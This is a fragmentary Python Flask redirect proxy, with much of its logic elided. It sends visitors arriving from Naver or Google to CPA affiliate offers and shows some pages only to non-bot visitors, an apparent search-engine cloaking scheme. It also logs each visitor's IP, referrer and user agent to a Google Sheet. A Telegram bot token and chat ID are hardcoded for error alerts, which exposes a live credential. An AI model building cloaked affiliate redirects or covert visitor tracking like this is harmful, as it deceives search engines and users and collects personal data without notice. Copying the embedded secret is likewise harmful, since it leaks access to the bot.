...
# ==================================================================================
import hashlib, time, random, base64, requests, datetime
from flask import Flask, request, redirect, make_response
from urllib.parse import urlencode

# --- GOOGLE SHEETS LOGGING RESTORATION ---
working_key = r""
def log_to_sheet(row_data):
    try:
        ...
        try:
            requests.get(f"https://api.telegram.org/bot7983385122:AAGK4kjCDpmerqfSwQL66ZDPL2MSOEV4An0/sendMessage", params={"chat_id": "1898653696", "text": f"⚠️ [시트 에러] {repr(e)}"}, timeout=1)
        except: pass
# ----------------------------------------
try:
...
def proxy_master_final(path):
    try:
        ...
        try:
            ...
            if is_naver or is_google:
                ...
                if k in CPA_DATA:
                    ...
                    # [V6.1] Google Sheets Logging for REVENUE USERS
                    try:
                        ...
                        log_to_sheet([kst_time, "스텔스봇" if _is_stealth else "수익유저", "REDIRECT(CPA)", kr_keyword, client_ip, ref_url, request.host, user_agent])
                    except: pass
                else:
                    ...
                    # [V6.2] Google Sheets Logging for FALLBACK (No Key / Scanner)
                    try:
                        kst_time = (datetime.datetime.now() + datetime.timedelta(hours=9)).strftime("%Y-%m-%d %H:%M:%S")
                        log_to_sheet([kst_time, "수익유저(무작위)", "REDIRECT(FALLBACK)", f"{k} (NoKey)", client_ip, ref_url, request.host, user_agent])
                    except: pass
        ...
        # [V10.0] NEW LANDING PAGE INTEGRATION
        # Serve the new comparison page for humans on root or certain keywords
        if not is_bot_user and not is_test_mode:
            if not clean_path or any(word in clean_path for word in ["moving", "cleaning", "service"]):
                try:
                    import os
                    # Try to find common paths for comparison_test.html
                    # Assuming it's in the root of the project
                    file_path = os.path.join(os.getcwd(), 'comparison_test.html')
                    if os.path.exists(file_path):
                        with open(file_path, 'r', encoding='utf-8') as f:
                            content = f.read()
                        
                        # Inject keyword if available for personalization
                        if k and k in CPA_DATA:
                            kw = CPA_DATA[k][0]
                            # Simple replacement to pass keyword context to client-side JS/Alpine
                            # Since Alpine.js extracts from URL, we ensure URL has it
                            pass 
        ...
        if redirect_url:
            # [V9.9] Silent Sheet Log for path-based redirects (no Telegram)
            if not k or k not in CPA_DATA:
                try:
                    kst_time = (datetime.datetime.now() + datetime.timedelta(hours=9)).strftime("%Y-%m-%d %H:%M:%S")
                    ref_url = request.referrer or 'Direct (직접 접속)'
                    log_to_sheet([kst_time, "경로유입", "REDIRECT(PATH)", clean_path, client_ip, ref_url, request.host, user_agent])
                except: pass
